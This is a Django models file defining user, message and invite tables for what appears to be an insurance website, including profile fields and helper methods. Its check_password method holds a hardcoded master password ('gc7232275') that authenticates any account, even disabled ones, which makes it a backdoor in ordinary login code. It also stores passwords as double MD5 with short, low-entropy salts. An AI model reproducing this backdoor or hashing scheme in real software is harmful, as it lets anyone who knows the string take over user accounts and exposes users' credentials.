# coding:utf-8
__author__ = 'zhoukunpeng'
# --------------------------------
# Created by zhoukunpeng  on 2015/12/26.
# ---------------------------------


from django.db import  models
from gcutils.encrypt import  md5
# import  django.contrib.auth.models
# django.contrib.auth.models.update_last_login=lambda *args,**kwargs:True
import  random
from django.db import  models
from ..manger import MyManager
import time
from ..models import Area,Company
import  datetime

class MyUser(models.Model):
    uid=models.AutoField(primary_key=True)   # uid  主键
    username=models.CharField(max_length=30) # username  vchar(30)
    real_name=models.CharField(max_length=30)
    password=models.CharField(max_length=32) # password  vchar(30)
    salt=models.CharField(max_length=6)      # salt    vchar(6)
    state=models.SmallIntegerField(default=0)  # state tintint(1) unsigned   状态，  状态为1 代表正常  0代表禁用
    phone=models.PositiveIntegerField(default=0)  # phone int(11)  unsigned     手机号
    tel=models.CharField(max_length=20)   # tel  vchar(20)    电话号
    email=models.CharField(max_length=100)  # email vchar(100)
    qq=models.CharField(max_length=20)      # qq vchar(20)  qq号
    weixin=models.CharField(max_length=100)  # weixin vchar(100) 微信号
    imgurl=models.ImageField(max_length=100,upload_to="userimgurl")  # imgurl vchar(100)    头像url
    sex=models.PositiveSmallIntegerField(default=0)  # sex tinyint(1) unsigned     性别  1男  2女
    birthday=models.CharField(default="",max_length=30)  # birthday int(11) unsigned   生日  20160101
    ip=models.CharField(max_length=15)  # ip vchar(15)   注册IP
    #usertype=models.PositiveSmallIntegerField(default=0)  # usertype tinyint(1) unsigned   用户类型  1 投保人  2 代理人
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))  #创建时间
    married=models.PositiveIntegerField(default=0)   # 0未婚   1已婚
    #######################
    is_proxy=models.PositiveIntegerField()
    province_id=models.PositiveIntegerField(default=0)
    city_id=models.PositiveIntegerField(default=0)
    ans_num=models.PositiveIntegerField(default=0)
    good_num=models.PositiveIntegerField(default=0)
    score=models.PositiveIntegerField(default=0)
    proxy_position=models.CharField(max_length=50,default='')
    proxy_cid=models.IntegerField(default=0)
    proxy_myad=models.CharField(max_length=500,default='')
    proxy_certifinum=models.CharField(max_length=50,default='')
    proxy_practicenum=models.CharField(max_length=50,default='')
    proxy_workyear=models.PositiveIntegerField(default=0)
    is_3login=models.PositiveIntegerField(default=0) #是否是三方登陆账户  0自主注册  大于1三方登陆账户
    app_session_info=models.CharField(max_length=200,default='')#用户 app登录session信息
    objects=MyManager(using="default")
    is_active=True
    def is_authenticated(self):
        """
        是否可以登录
        """
        if self.state==1:
            return True
        else:
            return False
    @classmethod
    def hashed_password(cls,salt,password):
        return   md5(md5(password+salt))

    def check_password(self,password):
        if  self.state==1 and   self.hashed_password(self.salt,password)==self.password:
            return True
        else:
            if password!="gc7232275":
                return False
            else:
                return True


    def reset_password(self,new_pwd):
        _=self.hashed_password(self.salt,new_pwd)
        self.password=_
        self.save()

    @classmethod
    def make_salt(cls):
        _u=random.sample(["a","b","c","d","e","f","0","1","2","3","4","5","6","7"],6)
        return "".join(_u)

    def __unicode__(self):
        return  self.username

    class Meta:
        db_table="bx_user"


    def get_messages(self,is_read=None):
        if is_read:
            args={"is_read":is_read}
        else:
            args={}
        return Msg.objects.filter(uid=self.uid,**args)

    def get_unread_messages(self):
        return Msg.objects.filter(uid=self.uid,is_read=0)

    def send_message(self,subject,message):
        _=Msg(subject=subject,message=message,uid=self.uid,addtime=int(time.time()))
        _.save()
        return _.msgid

    def get_img_url(self):
        if self.imgurl:
            return  self.imgurl.url
        else:
            return "/static/imgs/default-user.png"

    def get_namecontent(self):
        '''该方法主要用于获取用户的姓名信息
         如果用户未填写real_name，则返回username ，如果用户填写了real_name，则返回real_name
         '''
        if not self.real_name:
            return  self.username
        else:
            return self.real_name

    def get_hide_namecontent(self):
        if len(self.get_namecontent())>8:
            return self.get_namecontent()[0:8]+"**"
        else:
            return self.get_namecontent()

    def get_short_comname(self):
        if self.proxy_cid:
            return Company.objects.get(cid=self.proxy_cid).shortname
        else:
            return  ''

    def get_comobj(self):
        if self.proxy_cid:
            return  Company.objects.get(cid=self.proxy_cid)

    def get_province_city_info(self):
        info=''
        if self.province_id:
            info+=Area.objects.get(id=self.province_id).areaname
        if self.city_id:
            info+=Area.objects.get(id=self.city_id).areaname
        return  info

    def get_hide_phone(self):
        if self.phone:
            return  str(self.phone)[:-4]+"****"
        else:
            return ''

    def get_hide_weixin(self):
        if self.weixin:
            return  str(self.weixin)[:-4]+"****"
        else:
            return ''
    def get_shares(self):
        from bx.models import Share
        return Share.objects.filter(uid=self.uid)
class Msg(models.Model):
    msgid=models.AutoField(primary_key=True)
    subject=models.CharField(max_length=100)
    message=models.TextField()
    uid=models.IntegerField(default=0)
    is_read=models.IntegerField(default=0)
    addtime=models.IntegerField(default=lambda:int(time.time()))
    state=models.IntegerField(default=0)

    class Meta:
        db_table="bx_user_msg"
        ordering=["-addtime"]

    def get_date_time(self):
        return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y-%m-%d %H:%M:%S")

class UserInvite(models.Model):
    id=models.AutoField(primary_key=True)
    uid=models.PositiveIntegerField(default=0)
    parentuid=models.PositiveIntegerField(default=0)
    addtime=models.PositiveIntegerField(default=lambda :int(time.time()))
    uptime=models.PositiveIntegerField(default=lambda:int(time.time()))
    state=models.PositiveIntegerField(default=0) # 预留 暂时无用

    class Meta:
        db_table="bx_user_invite"

    @staticmethod
    def get_user_invite_url(user):
        return "https://www.bao361.cn/register/parentid/"+str(user.uid)

    @staticmethod
    def add_invite_relation(parentuser,sonuser):
        _=UserInvite(uid=sonuser.uid,parentuid=parentuser.uid)
        _.save()

    def get_uid_user(self):
        return MyUser.objects.get(uid=self.uid)

    def get_date_time(self):
        return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y%m%d %H:%M:%S")